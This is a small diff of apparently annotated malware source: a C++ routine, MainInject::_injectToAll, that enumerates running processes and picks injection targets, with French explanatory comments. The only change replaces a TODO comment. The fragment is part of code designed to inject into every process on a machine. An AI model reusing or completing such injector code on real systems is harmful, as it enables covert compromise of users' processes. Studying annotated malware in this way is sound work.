@@ -107,7 +107,7 @@ bool MainInject::_injectToAll(void)
  
       if(CWA(kernel32, Process32FirstW)(snap, &pe))do //Process32FirstW permet de récupérer les informatios sur le premier processus dans la liste. Ces informations sont enregistrés dans pe
       {
-        if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid) //si pid du processes est valide et TODO
+        if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid) //si pid du processes est valide et n'est pas le processus maitre
         {
           TOKEN_USER *tu; //structure qui identifie un utilisateur associé à son token (qui l'identifie, identifie son groupe et ses privilèges)
           DWORD sessionId; //id de l'utilisateur du processus
